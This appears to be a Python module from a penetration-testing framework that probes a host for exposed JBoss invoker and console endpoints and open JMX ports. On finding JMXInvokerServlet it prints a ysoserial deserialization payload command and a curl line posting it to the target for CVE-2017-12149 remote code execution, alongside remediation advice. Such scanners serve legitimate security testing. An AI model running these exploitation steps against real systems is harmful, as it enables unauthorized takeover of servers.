#!/usr/bin/env python3
"""
JBoss Security Checker - CVE-2017-12149
"""
import sys
import os
import urllib.request
import urllib.error

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.base_module import BaseModule
from utils.colors import *

class JBossModule(BaseModule):
    
    def __init__(self, frontdoor):
        super().__init__(frontdoor)
        self.name = "JBoss"
        self.port = 8080
    
    def run(self):
        """Check for JBoss vulnerabilities"""
        module_name = "JBoss"
        target = self.get_target()
        
        print(f"\n[*] Testing {target} for JBoss...")
        
        ports = [8080, 8081, 8082, 9990, 9999, 1099]
        
        for port in ports:
            if not self.check_port(port, timeout=2):
                continue
            
            # HTTP ports
            if port in [8080, 8081, 8082, 9990]:
                self.check_http_endpoints(target, port, module_name)
            
            # JMX ports
            if port in [1099, 9999]:
                self.check_jmx(target, port, module_name)
    
    def check_http_endpoints(self, target, port, module_name):
        """Check JBoss HTTP endpoints"""
        vulnerable_endpoints = [
            ("/invoker/JMXInvokerServlet", "JMX Invoker - CVE-2017-12149"),
            ("/invoker/EJBInvokerServlet", "EJB Invoker - CVE-2009-2693"),
            ("/invoker/JMXInvokerServlet?action=inspectMBean&name=jboss.system:type=ServerInfo", "Server Info"),
            ("/jmx-console/", "JMX Console"),
            ("/admin-console/", "Admin Console"),
            ("/web-console/", "Web Console"),
            ("/status", "Status Page"),
            ("/status?full=true", "Full Status")
        ]
        
        for endpoint, description in vulnerable_endpoints:
            try:
                url = f"http://{target}:{port}{endpoint}"
                req = urllib.request.Request(url, method='GET')
                response = urllib.request.urlopen(req, timeout=5)
                
                content = response.read().decode('utf-8', errors='ignore')
                
                # Check for JBoss indicators
                if response.getcode() == 200:
                    if 'jboss' in content.lower() or 'invoker' in content.lower():
                        self.log(module_name, "VULNERABLE", 
                                f"JBoss endpoint exposed: {url} - {description}")
                        
                        if 'JMXInvokerServlet' in endpoint:
                            self.log(module_name, "RCE_POSSIBLE", 
                                    "JMXInvokerServlet allows remote code execution")
                            
                            print("""
    [*] JBoss CVE-2017-12149 Exploitation:
    
    The JMXInvokerServlet is vulnerable to Java deserialization RCE.
    
    Exploitation steps:
    1. Use ysoserial to generate payload:
       java -jar ysoserial.jar CommonsCollections5 'command' > payload.ser
    
    2. Send payload to target:
       curl -X POST -H 'Content-Type: application/x-java-serialized-object' \\
            --data-binary @payload.ser \\
            http://TARGET:8080/invoker/JMXInvokerServlet
    
    Remediation:
    - Remove or restrict access to invoker servlets
    - Upgrade JBoss to latest EAP version
    - Apply security hardening guidelines
                            """)
                        return
                        
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    self.log(module_name, "PROTECTED", f"JBoss {endpoint} requires authentication")
                elif e.code == 403:
                    self.log(module_name, "PROTECTED", f"JBoss {endpoint} access forbidden")
                else:
                    self.log(module_name, "ERROR", f"JBoss {endpoint} returned HTTP {e.code}")
            except Exception as e:
                self.log(module_name, "ERROR", f"JBoss {endpoint} check failed: {str(e)[:80]}")
                continue

    def check_jmx(self, target, port, module_name):
        """Check JMX RMI ports"""
        self.log(module_name, "POTENTIAL",
                f"JMX port {port} open - possible RMI exposure")
        self.print_exploit_steps([
            f"Manual verification: service:jmx:rmi:///jndi/rmi://{target}:{port}/jmxrmi",
            "Use Java's jconsole or jvisualvm to connect and enumerate MBeans",
            "If unauthenticated, JMX can be used to deploy MBeans for RCE",
        ])
